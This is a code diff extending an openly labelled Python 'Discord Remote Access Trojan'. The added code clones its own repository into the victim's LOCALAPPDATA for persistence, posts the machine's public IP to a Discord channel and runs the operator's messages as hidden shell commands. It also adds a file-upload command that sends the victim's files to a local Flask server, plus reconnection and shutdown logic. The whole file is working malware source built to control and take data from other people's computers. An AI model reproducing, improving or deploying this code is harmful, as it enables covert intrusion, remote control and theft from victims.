@@ -1,5 +1,6 @@
 from discord.ext import commands
 from pathlib import Path
+from threading import Thread 
 import discord
 import urllib.request
 import requests
@@ -9,14 +10,60 @@ import shutil
 import time
 import os
 import sys
+import stat
+
+hard_stop = False
+flask_process = None
 
 DISCORD_TOKEN = "PLACE_DISCORD_BOT_TOKEN_HERE"
 
-TARGET_DIR = r"C:\Users\Discord-RAT-SAVE"
-EXE_DIR = r"C:\Users\DiscordRAT.py"
-
+local_app_data = os.getenv('LOCALAPPDATA')
+TARGET_DIR = os.path.join(local_app_data, 'Discord-RAT-Bot')
+EXE_DIR = os.path.join(TARGET_DIR, "DiscordRAT.py")
+UPLOAD_FOLDER = os.path.join(TARGET_DIR, "uploads") 
+STATE_FILE = os.path.join(TARGET_DIR, "state.txt")
 GIT_DIR = os.path.join(os.getenv("LOCALAPPDATA"), "GitPortable")
 GIT_EXE = os.path.join(GIT_DIR, "cmd", "git.exe")
+
+if not os.path.exists(TARGET_DIR):
+    os.makedirs(TARGET_DIR, exist_ok=True)
+
+repo_url = "https://github.com/The-R34per/Discord-Remote-Access-Trojan"
+folder = "DiscordRAT"   
+
+def clone_github_repo(repo_url):
+    
+    local_app_data = os.getenv('LOCALAPPDATA')
+    target_dir = os.path.join(local_app_data, 'Discord-RAT-Bot')
+
+    print(f"Target Directory: {target_dir}")
+
+    if os.path.exists(target_dir):
+        print(f"Directory already exists. Cleaning up {target_dir}...")
+        try:
+            shutil.rmtree(target_dir)
+        except Exception as e:
+            print(f"Error deleting existing directory: {e}")
+            return
+
+    os.makedirs(os.path.dirname(target_dir), exist_ok=True)
+
+    try:
+        print(f"Cloning {repo_url}...")
+        subprocess.run(['git', 'clone', repo_url, target_dir], check=True)
+        print("\nSuccess! Repository cloned to AppData\\Local\\DiscordTEST")
+    except subprocess.CalledProcessError as e:
+        print(f"\nAn error occurred while cloning: {e}")
+    except FileNotFoundError:
+        print("\nError: 'git' command not found. Please ensure Git is installed and in your PATH.")
+
+
+required_files = ["DiscordRAT.py", "state.txt", "DiscordRATSupervisor.py", "uploads", "FlaskServer.py"]
+
+for filename in required_files:
+    file_path = os.path.join(TARGET_DIR, filename)
+    if not os.path.exists(file_path):
+        clone_github_repo(repo_url)
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -32,19 +79,21 @@ ps = subprocess.Popen(
     creationflags=subprocess.CREATE_NO_WINDOW
 )
 
+def update_state(status):
+    state_path = STATE_FILE
+    with open(state_path, "w") as f:
+        f.write(status)
+
 def find_portable_git():
-    """Return the full path to portable git.exe if it exists, else None."""
     if not os.path.exists(GIT_DIR):
         return None
 
-    # Look for a folder starting with "PortableGit"
     for name in os.listdir(GIT_DIR):
         full = os.path.join(GIT_DIR, name)
         if os.path.isdir(full) and name.lower().startswith("portablegit"):
             git_path = os.path.join(full, "cmd", "git.exe")
             if os.path.exists(git_path):
                 return git_path
-
     return None
     
 def open_terminal_with_command(command):
@@ -54,15 +103,6 @@ def open_terminal_with_command(command: str):
     subprocess.Popen(["cmd", "/k", command])
 
 def check_git_installation():
-    """
-    Checks for Git in two locations:
-    1. System PATH (shutil.which)
-    2. Portable Git folder in LOCALAPPDATA/GitPortable/cmd/git.exe
-
-    Returns:
-        (ok: bool, message: str, git_path: str or None)
-    """
-
     system_git = shutil.which("git")
     if system_git:
         return True, "System Git found.", system_git
@@ -111,7 +151,7 @@ def move_pyinstaller_output(target_dir):
     if spec_file and os.path.exists(spec_file):
         shutil.move(spec_file, os.path.join(target_dir, os.path.basename(spec_file)))    
   
-  
+
 def execute_cmd(cmd):
     marker = "__CMD_DONE__"
     
@@ -136,10 +176,21 @@ def execute_cmd(cmd):
 
 @client.event
 async def on_ready():
-    global channel
+    global channel, flask_process
     guild = client.guilds[0]
     ip = requests.get("https://api.ipify.org").text.replace(".", "-")
     channel = await guild.create_text_channel("Computer: " + ip)
+    
+    if not os.path.exists(UPLOAD_FOLDER):
+        os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+  
+    status_file = os.path.join(TARGET_DIR, "state.txt")
+    with open (status_file, "w") as f:
+        f.write("running")
+    
+    flask_process = subprocess.Popen(
+        ["python", os.path.join(TARGET_DIR, "FlaskServer.py")],
+        cwd=TARGET_DIR)
    
     ascii_art = r"""
 
@@ -204,13 +255,20 @@ async def on_ready():
     -----------------------------------------------------------------------------------------------------
     Custom Commands:
     
-    "shutdown" = Terminates this session
+    "shutdown" = Terminates this session, and activates supervisor script
+    "hard-shutdown" = Terminates all scripts completly
     "create-exe" = Creates an executable file and stores in in a file
     "create-clone" = creates a clone of the repository and stores it locally on the victims' system
     
     -----------------------------------------------------------------------------------------------------
     Examples:
     
+    "ls"
+    This will list your current working directory
+    ---
+    "pwd"
+    This will print your current path (current working directory)
+    ---
     "cd Destop"
     This changes your directory to user's desktop
     ---
@@ -218,24 +276,84 @@ async def on_ready():
     This creates a file called "hello.txt" in the current directory with the text "Hello World"
 """
 
+
     chunks = [ascii_art[i:i+1900] for i in range(0, len(ascii_art), 1900)]
     for part in chunks:
         await channel.send(f"```\n{part}\n```")
     
+    
+    time.sleep(1)
+    await channel.send(f"```The source code has been cloned into the folder {TARGET_DIR}.```")
+  
 @client.event
 async def on_message(message):
+    global hard_stop
+    
     if not channel or message.channel.id != channel.id:
         return
 
     if message.author.bot:
         return
     
-    result = execute_cmd(message.content) or f"Executed \"{message.content}\" with no output."
+    if hard_stop:
+        if message.content.lower() in ("y", "yes"):
+            await message.channel.send("```Discord Remote Access Trojan is terminating...```")
+            update_state("hardstop")
+            
+            for f in os.listdir(UPLOAD_FOLDER):
+                try:
+                    os.remove(os.path.join(UPLOAD_FOLDER, f))
+                    requests.post("http://127.0.0.1:5000/shutdown?state=hardstop")
+                except:
+                    pass
+                if flask_process:
+                    flask_process.terminate()
+            await client.close()
+            return
+        elif message.content.lower() in ("n", "no"):
+            hard_stop = False
+            await message.channel.send("```Hard shutdown cancelled, script will remain running until stopped.```")
+            return
+    if message.content.lower() == "hard-shutdown":
+        hard_stop = True
+        await message.channel.send(
+            "```You are about to do a hard shutdown, this means that the supervisor script WILL NOT run, "
+            "and you will not be able to reconnect to this computer again. You will no longer be able to "
+            "access the web server once this script stops."
+            "Are you sure you want to do a hard shutdown (Y/N)?```"
+        )
+        return
     
+    if message.content.startswith("upload "):
+        raw_path = message.content.split(" ", 1)[1]
+        filepath = os.path.abspath(raw_path)
+
+        if not os.path.exists(filepath):
+            await message.channel.send("File not found on system.")
+            return
+
+        short_name = os.path.basename(filepath)
+        
+        with open(filepath, "rb") as f:
+            files = {"file": (short_name, f)} # Explicitly name the part
+            url = "http://127.0.0.1:5000/upload"
+            try:
+                response = requests.post(url, files=files)
+                if response.status_code == 200:
+                    await message.channel.send(f"Uploaded `{short_name}` successfully.")
+                    return 
+                else:
+                    await message.channel.send(f"Server rejected upload (Status {response.status_code}): {response.text}")
+                    return
+            except requests.exceptions.ConnectionError:
+                await message.channel.send("Critical Error: Could not connect to the Flask server. Is it running?")
+                return
+
     if message.content.lower() == "shutdown":
         await message.channel.send("Starting the supervisor script for reconnection...")
         subprocess.Popen(["python", "DiscordRATSupervisor.py"])
         time.sleep(1)
+        update_state("supervisor")
         await message.channel.send("Supervisor script running, terminating session.")
         await client.close()
         return
@@ -263,10 +381,18 @@ async def on_message(message):
         await message.channel.send(f"Clone created at {TARGET_DIR}.")
         return
     
+    result = execute_cmd(message.content) or f"Executed \"{message.content}\" with no output."
+
     while True:
         await message.channel.send(result[:2000])
         if len(result) < 2000:
             break
         result = result[2000:]
-        
+
+
+if not os.path.exists(TARGET_DIR):
+    os.makedirs(TARGET_DIR, exit_ok=True)
+
+update_state("running")
 client.run(DISCORD_TOKEN)
+
